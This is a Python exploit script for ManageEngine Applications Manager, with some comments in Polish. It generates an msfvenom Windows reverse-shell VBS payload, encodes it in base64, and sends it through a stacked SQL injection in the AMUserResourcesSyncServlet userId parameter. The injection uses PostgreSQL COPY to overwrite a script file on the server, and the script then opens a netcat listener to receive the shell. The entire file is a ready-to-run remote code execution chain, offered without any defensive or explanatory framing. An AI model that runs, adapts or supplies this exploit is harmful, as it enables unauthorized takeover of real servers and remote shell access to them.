import sys
import requests
import time
import os
import base64
import threading
import subprocess
import urllib.parse
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


MSFVENOM_GENERATED_FILENAME = "vbs_payload.vbs"
VBS_CONVERTED_TO_ONELINER_FILENAME = "vbs_payload_oneliner.vbs"


proxy = "http://127.0.0.1:8080"  # Proxy, które chcesz użyć

MSFVENOM_PAYLOAD = ""
ONELINER_PAYLOAD = ""
ENCODED_PAYLOAD  = ""


def generateMsfvenomPayload(attacker_ip, attacker_port):
    try:
        command = [
            "msfvenom",
            "-p", "windows/shell_reverse_tcp",
            "LHOST=%s" % attacker_ip,
            "LPORT=%s" % attacker_port,
            "-f", "vbs"
        ]
        print("Running command: %s" % " ".join(command))
        
        # Use subprocess to capture the output
        result = subprocess.run(command, check=True, capture_output=True, text=True)
        
        # The payload is in result.stdout
        payload = result.stdout
        print("Payload generated successfully.")
        return payload
    except subprocess.CalledProcessError as e:
        print("Failed to generate payload: %s" % str(e))
        return None
    except Exception as e:
        print("An error occurred: %s" % str(e))
        return None

def convertVbsToOneLiner(vbs_code):
    try:
        one_liner_code = (
            vbs_code
            .replace("\r", "")
            .replace("\n", ":")
            .replace("\t", " ")
            .replace("& _ :", "& ")
            .replace("& _:", "& ")
        )
        return one_liner_code
    except Exception as e:
        print("An error occurred: %s" % str(e))
        return None

def EncodeToBase64(file_content):
    try:
        # Kodowanie do base64
        encoded_content = base64.b64encode(file_content.encode('utf-8'))
        # Dekodowanie bajtów do stringa
        repaired_payload = encoded_content.decode('utf-8')
        return repaired_payload
    except Exception as e:
        print(f"Wystąpił błąd: {e}")
        return None


def generatePayload(attacker_ip, attacker_port):

    MSFVENOM_PAYLOAD = generateMsfvenomPayload(attacker_ip, attacker_port)
    ONELINER_PAYLOAD = convertVbsToOneLiner(MSFVENOM_PAYLOAD)
    ENCODED_PAYLOAD = EncodeToBase64(ONELINER_PAYLOAD)
    
    return ENCODED_PAYLOAD


def runNetcatListener(attacker_ip, attacker_port):
    try:
        # Example: Start a netcat listener
        command = [
            "nc", "-lvp", attacker_port
        ]
        print("Starting netcat listener with command: %s" % " ".join(command))
        subprocess.run(command, check=True)
        print("Netcat listener started successfully.")
    except subprocess.CalledProcessError as e:
        print("Failed to start netcat listener: %s" % str(e))
    except Exception as e:
        print("An error occurred: %s" % str(e))


def main():
    if len(sys.argv) != 4:
        print("(+) usage: %s <target> <attacker_ip> <attacker_port>" % sys.argv[0])
        print("(+) eg: %s target 192.168.1.1 8080" % sys.argv[0])
        sys.exit(1)
    
    target = sys.argv[1]
    attacker_ip = sys.argv[2]
    attacker_port = sys.argv[3]
    
    print("Target:", target)
    print("Attacker IP:", attacker_ip)
    print("Attacker Port:", attacker_port)
    
    partialPayload = generatePayload(attacker_ip, attacker_port)

    generateMsfvenomPayload(attacker_ip, attacker_port)
    

    target = "manageengine"  # Zastąp wartością docelową
    sqli = "1;copy+(select+convert_from(decode($$"+partialPayload+"$$,$$base64$$),$$utf-8$$))+to+$$C:\\Program+Files+(x86)\\ManageEngine\\AppManager12\\working\\conf\\\\application\\scripts\\wmiget.vbs$$;--+"
    print(sqli)
    proxy = "http://127.0.0.1:8080"  # Proxy, które chcesz użyć
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}

    #payloadWithoutSpaces = sqli.replace(' ', '+')
    #print(payloadWithoutSpaces)
    start_time = time.time()
    url = f'https://{target}:8443/servlet/AMUserResourcesSyncServlet'
    data = {'ForMasRange': '1', 'userId': sqli}
    payload_str = urllib.parse.urlencode(data, safe=':+();$\\\,=')

    try:
        response = requests.post(url, data=payload_str, headers=headers, verify=False, proxies={'http': proxy, 'https': proxy})
        print(response.text)
    except Exception as e:
        print(f"Wystąpił błąd: {e}")
    
    end_time = time.time()
    # print (r.text)
    # print (r.headers)

    time_of_execution = end_time - start_time

   #Start the netcat listener in a separate thread
    listener_thread = threading.Thread(target=runNetcatListener, args=(attacker_ip, attacker_port))
    listener_thread.start()
    
    #Wait for the netcat listener thread to complete (optional)
    listener_thread.join()

    print(time_of_execution)



main()